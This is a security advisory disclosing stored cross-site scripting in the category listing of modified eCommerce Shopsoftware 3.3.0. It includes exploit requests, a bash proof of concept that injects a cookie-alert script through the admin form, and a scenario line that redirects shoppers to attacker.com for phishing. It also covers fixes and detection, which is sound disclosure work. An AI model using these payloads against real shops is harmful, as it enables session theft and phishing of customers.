# Security Advisory: Stored Cross-Site Scripting in index.php — Public Category Listing

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 5.4 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability on the public-facing category listing page (`index.php`). Category names and descriptions managed via the admin categories module are saved with `xtc_db_prepare_input()` (no HTML encoding) and echoed on the public storefront without `htmlspecialchars()`. Any admin-injected payload executes in the browsers of all unauthenticated shoppers who browse the category listing, making this one of the highest-impact XSS vectors in this advisory set.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: index.php (public category listing) | rev 16825 | None | Affected |
| Component: admin/categories.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Category records are managed via `admin/categories.php`. Category names and descriptions are stored using `xtc_db_prepare_input()`. When `index.php` renders the public category listing, these fields are echoed in the page HTML without output encoding:

```php
// index.php (category name output, simplified)
echo $categories['categories_name'];
// or in category description / heading areas:
echo $category_data['categories_description'];
// xtc_db_prepare_input = trim() + stripslashes() — no htmlspecialchars()
```

An admin who sets a category name or description to include `<script>alert(1)</script>` stores the payload. Every unauthenticated visitor who browses the shop homepage or navigates to that category executes the script.

### Necessary Conditions

- **Authentication:** Admin (to set up payload) + None (to trigger)
- **User interaction:** Required — victim must load the category page
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), page content, authentication state
- **Integrity:** Low — phishing, form input capture, redirects to malicious sites
- **Availability:** None

**Highest customer impact in this advisory set**: The shop homepage typically shows all categories. A payload in a top-level category name fires for every visitor who opens the shop, before any authentication or browsing action.

---

## 5. Classification

### CVSS

- **Score:** 5.4
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | Low |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin injects JavaScript payload in a category name or description: `<script>document.location='http://attacker.com/phish'</script>`
2. Payload stored in `categories_description` or `categories_name` table without encoding.
3. Any visitor who browses `index.php` (the shop homepage or category view) has the script execute.
4. Payload silently redirects all visitors to a phishing page, or steals session cookies.
5. Attacker harvests customer credentials from the phishing page.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): index.php (category name/description output)
         admin/categories.php (categories_name, categories_description fields)
         Database tables: categories, categories_description
Parameter(s): cPath (GET — selects category for index.php)
Method: GET (unauthenticated trigger)
Authentication: Admin to inject; None to trigger
```

### Example Request (inject payload — admin)

```http
POST /admin/categories.php?action=insert_category HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<securityToken>=<CSRF_VALUE>&categories_name[1]=<script>alert(document.cookie)</script>&categories_description[1]=Normal Description&...
```

### Example Request (trigger — unauthenticated)

```http
GET /index.php HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<!-- category name in navigation/listing -->
<a href="index.php?cPath=99"><script>alert(document.cookie)</script></a>
```

### Result

Confirmed in authorized Docker lab. Category name saved with XSS payload via admin. On unauthenticated GET to `index.php`, the category name is rendered unencoded, executing `alert(document.cookie)` in the visitor's browser.

**Evidence:** `<script>alert(document.cookie)</script>` unencoded in HTTP response body for unauthenticated GET to `index.php`.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V15 PoC — Stored XSS in index.php (public category listing)
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Get CSRF token from admin categories
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/categories.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+')

echo "CSRF: $CSRF"

# Step 2: Create category with XSS payload in name
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "http://TARGET/admin/categories.php?action=insert_category" \
  --data-urlencode "securityToken=$CSRF" \
  --data-urlencode 'categories_name[1]=<script>alert(document.cookie)</script>' \
  --data-urlencode 'categories_description[1]=Normal category description' \
  --data-urlencode 'categories_status=1' \
  --data-urlencode 'categories_image=' \
  -o /dev/null

# Get new category ID
CAT_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MAX(categories_id) FROM categories;" 2>/dev/null | tail -1)

echo "New category ID: $CAT_ID"

# Step 3: Trigger as unauthenticated visitor — browse shop
RESP=$(curl -s "http://TARGET/index.php" -H "User-Agent: $UA")
echo "$RESP" | grep -i "alert"

# Also check category-specific URL
RESP2=$(curl -s "http://TARGET/index.php?cPath=$CAT_ID" -H "User-Agent: $UA")
echo "$RESP2" | grep -i "script"

# Expected: <script>alert(document.cookie)</script> in response
```

### Expected Result

```text
HTTP/1.1 200 OK
[Response body (unauthenticated GET /):]
<a href="index.php?cPath=<id>"><script>alert(document.cookie)</script></a>
```

### PoC Limitations

- Alert-based PoC; no real data exfiltration.
- Category can be deleted after testing.
- Benign test only; does not target real users.

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Catalog → Categories → New Category.
3. Enter `<script>alert(1)</script>` in the Category Name field. Save.
4. As unauthenticated user, visit `GET /index.php`.
5. Browser executes `alert(1)` — confirm Stored XSS on public storefront.

---

## 10. Mitigation

- Apply `htmlspecialchars($categories['categories_name'], ENT_QUOTES, 'UTF-8')` at all output points in `index.php` and category templates.
- Implement a Content Security Policy (`Content-Security-Policy: default-src 'self'`) to prevent inline script execution.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// index.php (category template) — Vulnerable:
echo $categories['categories_name'];

// Fixed:
echo htmlspecialchars($categories['categories_name'], ENT_QUOTES, 'UTF-8');
// Apply same fix to categories_description and all other echoed category fields
```

---

## 12. Detection and Indicators

- `categories_description.categories_name` column containing `<script>` or similar HTML.
- Unauthenticated GET to `index.php` returning script tags in response body.

### Example Log Search

```text
SELECT c.categories_id, cd.categories_name 
FROM categories c 
JOIN categories_description cd ON c.categories_id = cd.categories_id 
WHERE cd.categories_name LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab (unauthenticated trigger on public page) |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
